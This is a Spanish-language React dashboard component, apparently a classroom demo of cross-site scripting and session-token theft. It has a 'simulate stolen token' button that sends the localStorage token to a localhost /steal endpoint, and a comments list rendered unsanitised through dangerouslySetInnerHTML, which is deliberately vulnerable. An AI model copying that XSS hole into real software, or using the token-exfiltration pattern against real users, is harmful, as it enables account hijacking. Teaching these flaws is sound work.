import { useState, useEffect } from "react";

function Dashboard() {
  const [message, setMessage] = useState("");
  const [user, setUser] = useState(null);
  const [comment, setComment] = useState("");
  const [comments, setComments] = useState([]);
  const [stolenToken, setStolenToken] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    const token = localStorage.getItem("token");

    if (!token) {
      setMessage("Token no encontrado. Por favor inicia sesión de nuevo.");
      return;
    }

    fetch("http://localhost:4000/dashboard", {
      headers: {
        Authorization: "Bearer " + token
      }
    })
      .then(res => {
        if (!res.ok) {
          throw new Error(`Error ${res.status}: ${res.statusText}`);
        }
        return res.json();
      })
      .then(data => {
        setMessage(data.message);
        setUser(data.user);
      })
      .catch(err => setMessage(`No se pudo cargar el dashboard: ${err.message}`));
  }, []);

  const addComment = () => {
    setComments([...comments, comment]);
    setComment("");
  };

  const stealToken = () => {
    const token = localStorage.getItem("token");

    if (!token) {
      setStatus("No se encontró el token en el navegador.");
      return;
    }

    fetch(`http://localhost:4000/steal?token=${encodeURIComponent(token)}`)
      .then(res => {
        if (!res.ok) {
          throw new Error(`Error ${res.status}: ${res.statusText}`);
        }
        return res.json();
      })
      .then(data => {
        setStolenToken(data.token);
        setStatus(data.message);
      })
      .catch(err => setStatus(`No se pudo robar el token: ${err.message}`));
  };

  return (
    <div className="page dashboard-page">
      <div className="card dashboard-card">
        <h1>Dashboard</h1>
        <p className="subtitle">{message}</p>

        {user && (
          <div className="user-box">
            <p><strong>Usuario:</strong> {user.username}</p>
            <p><strong>Rol:</strong> {user.role}</p>
          </div>
        )}

        <button className="button primary" onClick={stealToken}>
          Simular token robado
        </button>

        {status && <p className="status">{status}</p>}

        {stolenToken && (
          <div className="token-box">
            <h2>Token robado</h2>
            <code>{stolenToken}</code>
          </div>
        )}
      </div>

      <div className="card comments-card">
        <h2>Comentarios</h2>
        <div className="comment-form">
          <input
            className="input"
            value={comment}
            onChange={e => setComment(e.target.value)}
            placeholder="Escribe un comentario"
          />
          <button className="button secondary" onClick={addComment}>
            Agregar
          </button>
        </div>
        <div className="comments-list">
          {comments.map((c, i) => (
            <p key={i} className="comment" dangerouslySetInnerHTML={{ __html: c }} />
          ))}
        </div>
      </div>
    </div>
  );
}

export default Dashboard;